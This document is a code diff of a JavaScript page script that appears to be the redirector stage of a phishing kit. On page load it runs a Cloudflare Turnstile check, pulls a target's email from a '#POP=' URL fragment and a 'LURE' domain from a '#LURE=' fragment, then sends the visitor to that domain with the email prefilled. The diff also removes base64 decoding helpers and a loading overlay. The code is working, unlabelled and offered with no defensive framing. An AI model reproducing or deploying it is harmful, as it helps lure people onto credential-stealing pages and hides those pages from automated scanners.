@@ -47,49 +47,7 @@
 window.onload = async function () {
     var USE_TURNSTILE = true;
 
-    // Create loading div
-    var loadingDiv = document.createElement("div");
-    loadingDiv.id = "lsrt";
-
-    // Decode Base64 to HTML
-    function decodeBase64ToHTML(base64) {
-        try {
-            return atob(base64);
-        } catch (e) {
-            console.error("Failed to decode base64", e);
-            return "";
-        }
-    }
-
-    // Decode Base64 to CSS
-    function decodeBase64ToCSS(base64) {
-        try {
-            return atob(base64);
-        } catch (e) {
-            console.error("Failed to decode base64", e);
-            return "";
-        }
-    }
-
-    var loadingStyle = document.createElement("style");
-    document.head.appendChild(loadingStyle);
-
-    // Remove loading animation after 3 seconds
-    setTimeout(function () {
-        loadingDiv.style.display = "none";
-    }, 3000);
-
-    // Function to decode Base64
-    function decodeBase64(encoded) {
-        try {
-            return atob(encoded);
-        } catch (e) {
-            console.error("Failed to decode base64", e);
-            return null;
-        }
-    }
-
-    // Extract and decode email from URL
+    // Extract and decode email from URL with #POP=
     function extractAndDecodeEmail() {
         const url = window.location.href;
         let email = null;
@@ -100,7 +58,15 @@ window.onload = async function () {
             try {
                 // Extract the part after `#POP=`
                 const hashFragment = url.substring(hashIndex + 5); // Skip past `#POP=`
+
+                // Decode the email if necessary (e.g., URL decoding)
                 email = decodeURIComponent(hashFragment);
+
+                // Ensure `#LURE=` part is ignored
+                const lureIndex = email.indexOf("#LURE=");
+                if (lureIndex !== -1) {
+                    email = email.substring(0, lureIndex);
+                }
             } catch (e) {
                 console.error("Failed to extract or decode email:", e);
             }
@@ -123,7 +89,14 @@ window.onload = async function () {
             try {
                 // Extract the part after `#LURE=`
                 domain = url.substring(lureIndex + 6); // Skip past `#LURE=`
-                domain = decodeURIComponent(domain); // Decode the domain if necessary
+
+                // Decode the domain if necessary (e.g., URL decoding)
+                domain = decodeURIComponent(domain);
+
+                // Remove unnecessary query parameters
+                if (domain.includes("?redirected=done")) {
+                    domain = domain.replace("?redirected=done", "");
+                }
             } catch (e) {
                 console.error("Failed to extract or decode domain:", e);
             }
@@ -135,20 +108,25 @@ window.onload = async function () {
         return domain;
     }
 
-    // Function to redirect to a properly formatted URL
+    // Redirect to a properly formatted URL
     async function redirectToProperUrl() {
         const email = extractAndDecodeEmail();
         const domain = extractLureDomain();
 
-        if (!email || !domain) {
-            console.error("Missing email or domain for redirection.");
+        if (!email) {
+            console.error("Email is missing. Cannot redirect.");
             return;
         }
 
-        // Construct the new URL
+        if (!domain) {
+            console.error("Domain (LURE) is missing. Cannot redirect.");
+            return;
+        }
+
+        // Construct the new redirect URL
         const redirectUrl = `${domain}#POP=${email}?redirected=done`;
 
-        console.log("Redirecting to:", redirectUrl); // Debug log to check the final URL
+        console.log("Redirecting to:", redirectUrl); // Debugging log
         window.location.href = redirectUrl; // Perform the redirection
     }
 
@@ -166,12 +144,8 @@ window.onload = async function () {
                         return;
                     }
 
-                    // Show loading animation again
-                    loadingDiv.style.display = "flex";
-
                     // Wait for 2 seconds, then redirect
                     setTimeout(async function () {
-                        loadingDiv.style.display = "none";
                         await redirectToProperUrl(); // Perform redirection with proper parameters
                     }, 2000);
                 },
